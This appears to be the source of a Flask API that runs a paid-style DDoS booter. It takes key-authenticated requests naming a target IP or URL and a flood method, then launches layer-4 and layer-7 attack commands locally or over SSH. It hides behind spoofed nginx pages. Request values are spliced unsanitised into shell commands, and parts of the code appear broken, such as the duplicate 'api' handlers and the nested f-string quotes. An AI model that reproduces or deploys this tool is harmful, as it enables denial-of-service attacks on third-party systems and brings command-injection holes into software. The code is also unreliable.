from flask import Flask,request
from urllib.parse import urlparse
import socket,time,json,os,hashlib,hmac,string,random,platform,threading,paramiko,ipaddress
from ipaddress import IPv4Address,IPv4Network

def validate_ip(ip):
    parts = ip.split('.')
    return len(parts) == 4 and all(x.isdigit() for x in parts) and all(0 <= int(x) <= 255 for x in parts) and not ipaddress.ip_address(ip).is_private

def validate_port(port):
    return port.isdigit() and int(port) >= 1 and int(port) <= 65535

def validate_size(size):
  return size.isdigit() and int(size) > 1 and int(size) <= 65536

def ip_range_blacklist(ip):

        with open("normal_blacklist.json") as e:
            data = json.load(e)

        list = dict(data["ranges"])
        
        for (range, name) in list.items():
            try:
                if IPv4Address(ip) in IPv4Network(range):
                    print(ip, range)
                    return True, name # its blacklisted
            except Exception:
                continue
        
        return False, None

def create_string(char=string.ascii_letters+string.digits,num=5):return "".join(random.choices(char, k=num))
key_hmac = f"{create_string(num=8)}-{create_string(num=4)}-{create_string(num=4)}-{create_string(num=4)}-{create_string(num=8)}".encode("UTF-8")

json_reader = []

def query_dict(name):
  global json_reader
  data_dict = {item[0]: item[1:] for item in json_reader}
  d = ''
  while True: # check data config it change
    try:d = data_dict.get(name, ('Not found', 'Not found')); break
    except:pass
  return d

def query_json():
   global json_reader
   try_round = 0
   read_me = []
   list_file = ['config_attack','config_methods','keys','parameters']
   while True:
     for a in list_file:
      p = '\\'
      if platform.system() == 'Linux':p = '/'
      with open(os.getcwd()+f'{p}{a}.json','r') as f:
       data = json.load(f)
       data_old = query_dict(a)
       hmac_new = ''
       if try_round != 0:hmac_new = hmac.new(key_hmac, json.dumps(data).encode(), hashlib.sha256).hexdigest()
       if hmac_new != data_old[1] and try_round != 0:
         read_me[read_me.index((a,data_old[0],data_old[1]))] = (a,data,hmac_new)
       elif try_round == 0:read_me.append((a,data,hmac_new))
     json_reader = read_me
     time.sleep(5)
     try_round += 1

app = Flask(__name__)

@app.route("/")
def index():
   return """<html><head>\n<title>Welcome to nginx!</title>\n<style>\n    body {        width: 35em;        margin: 0 auto;        font-family: Tahoma, Verdana, Arial, sans-serif;    }</style>\n<body>\n<h1>Welcome to nginx!</h1>\n<p>If you see this page, the nginx web server is successfully installed and\nworking. Further configuration is required.</p>\n<p>For online documentation and support please refer to\n<a href="http://nginx.org/">nginx.org</a>.<br>Commercial support is available at <a href="http://nginx.com/">nginx.com</a>.</p>\n<p><em>Thank you for using nginx.</em></p>\n<div id="sqrx-content-container"><div class="squarex_ext_modal"><div class="squarex_ext_dialog-container"><div id="module_dialog_root__disposableFileViewer"><div class="squarex_ext_dialog squarex_ext_light squarex_ext__hidden"></div></div></div></div></div></body></html>"""

@app.errorhandler(404) # spoofing for nginx server reply
def error_404(e):
    return "<html>\n <head>\n  <title>\n404 Not Found\n  </title>\n </head>\n <body>\n  <center>\n   <h1>\n404 Not Found\n   </h1>\n  </center>\n  <hr>\n  <center>\nnginx/1.20.2\n  </center>\n</html>\n<!-- a padding to disable MSIE and Chrome friendly error page -->\n<!-- a padding to disable MSIE and Chrome friendly error page -->\n<!-- a padding to disable MSIE and Chrome friendly error page -->\n<!-- a padding to disable MSIE and Chrome friendly error page -->\n<!-- a padding to disable MSIE and Chrome friendly error page -->\n<!-- a padding to disable MSIE and Chrome friendly error page -->"

def api_running_ssh(config_attack,command):
  ssh = paramiko.SSHClient()
  ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
  try:
    d = config_attack['ssh-login']
    ssh.connect(d['ip'],port=d['port'], username=d['username'], password=d['password'])
    ssh.exec_command(command)
  except:pass

def api_trace(command,config_attack):
  if config_attack['run-api'] == 'thread':os.system(command)
  elif config_attack['run-api'] == 'ssh-login':threading.Thread(target=api_running_ssh,args=(command,config_attack)).start() # forward

def check_meth(layer,meth,config_methods,data_parameters_dict,parameters):
    command = config_methods[layer][meth]['command']
    requirements = config_methods[layer][meth]['parameters']
    for a in requirements.split(','):
      if data_parameters_dict[a] == parameters[a]["default"]:return f'Not found {a}',404
      else:
       command = command.replace(f"::{a}::",str(data_parameters_dict[a]))
    return command,200

@app.route("/stop")
def stop():
  name = request.args.get("name",default="",type=str)
  config_attack = query_dict("config_attack")[0]
  if name == '':return 'Not found name'
  else:
    threading.Thread(target=api_trace,args=(f"pkill -f {name}",config_attack)).start()

def major_same():
  parameters = query_dict("parameters")[0]
  config_methods = query_dict("config_methods")[0]
  config_attack = query_dict("config_attack")[0]
  keys = query_dict("keys")[0]
  data_parameters = []
  for a in parameters.keys():
    default = parameters[a]["default"]
    if parameters[a]["type"] == 'int':data_parameters.append((a,request.args.get(a, default = default, type = int)))
    else:data_parameters.append((a,request.args.get(a, default = default, type = str)))
  data_parameters_dict = {item[0]: item[1] for item in data_parameters}
  key_list = []
  for a in keys.keys():key_list.append(keys[a])
  if data_parameters_dict['Method'] == '':return 'Not found Method',404
  if data_parameters_dict['Key'] == '':return 'Not found key',404
  if data_parameters_dict['Key'] not in key_list:return 'Invaild Key',404
  if data_parameters_dict['Ip'] == '' and data_parameters_dict['Url'] == '':return 'Not target',404
  
  if data_parameters_dict['Ip'] != '':
   if not validate_ip(data_parameters_dict['Ip']):return 'Invaild IP',404
   if ip_range_blacklist(data_parameters_dict['Ip'])[0] == True:return 'Blacklist IP',404
  
  if data_parameters_dict['Port'] != 0:
     if not validate_port(data_parameters_dict['Port']): return 'Invaild Port Max=65535',404
  if data_parameters_dict['Size'] != 0:
     if not validate_size(data_parameters_dict['Size']): return 'Invaild Size Max=65536',404
  
  ctime = time.ctime().split()
  id = f'{ctime[0]}-{ctime[1]}-{ctime[2]}-{ctime[4]}__{ctime[3].replace(':','-')}'
  name = ''
  if data_parameters_dict['Ip'] != '':name=f"""{id}-{data_parameters_dict['Ip'].replace('.','_')}"""
  elif data_parameters['Url'] != '':name = f"""{id}-{urlparse(data_parameters['Url'].rstrip()).netloc}"""
  t = 0
  if data_parameters_dict['Time'] != 0:t = data_parameters_dict['Time']
  else:t = data_parameters_dict['Thread']
  command_screen = f"screen -dm -S {name} timeout {t}"
  command = ''
  return command,command_screen,name,data_parameters_dict,config_attack,config_methods,parameters

@app.route("/layer4")
def api():
  command,command_screen,name,data_parameters_dict,config_attack,config_methods,parameters = major_same()
  
  #add you methods
  layer = 'Layer4'
  if data_parameters_dict['Method'] == 'TCP-RST':output,status = check_meth(layer,'TCP-RST',config_methods,data_parameters_dict,parameters)
  if data_parameters_dict['Method'] == 'UDP-STORM':output,status = check_meth(layer,'UDP-STORM',config_methods,data_parameters_dict,parameters)
  
  if status == 404:return output
  else:command = output

  if command != '':
    command_execute = f'{config_methods[layer][data_parameters_dict['Method']]['path']} && {command_screen} {command}'
    threading.Thread(target=api_trace,args=(command_execute,config_attack)).start()
  return name

@app.route("/layer7")
def api():
  command,command_screen,name,data_parameters_dict,config_attack,config_methods,parameters = major_same()
  
  #add you methods
  layer = 'Layer7'
  if data_parameters_dict['Method'] == 'HTTP-19':output,status = check_meth(layer,'HTTP-19',config_methods,data_parameters_dict,parameters)
  if data_parameters_dict['Method'] == 'RAPID-FAST':output,status = check_meth(layer,'RAPID-FAST',config_methods,data_parameters_dict,parameters)
  
  if status == 404:return output
  else:command = output

  if command != '':
    command_execute = f'{config_methods[layer][data_parameters_dict['Method']]['path']} && {command_screen} {command}'
    threading.Thread(target=api_trace,args=(command_execute,config_attack)).start()
  return name

ports = [8000,8001,8002,8003,8004,8005,8008,8080,8081,8082,8083,8084,8085]
for port in ports:
    try:
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(("127.0.0.1",port))
     s.send(f"GET /?port={port}&robot=robots.txt&time={time.time()} HTTP/1.1\r\nHost: 127.0.0.1\r\nUser-Agent: API-Hex.Discovery/{port}\r\n\r\n".encode()); s.recv(65536).decode()
     s.close()
    except Exception as e:
     print(f"Discovery Port={port}")
     ports = port
     break

if __name__ == "__main__":
    threading.Thread(target=query_json).start()
    app.run("0.0.0.0",ports)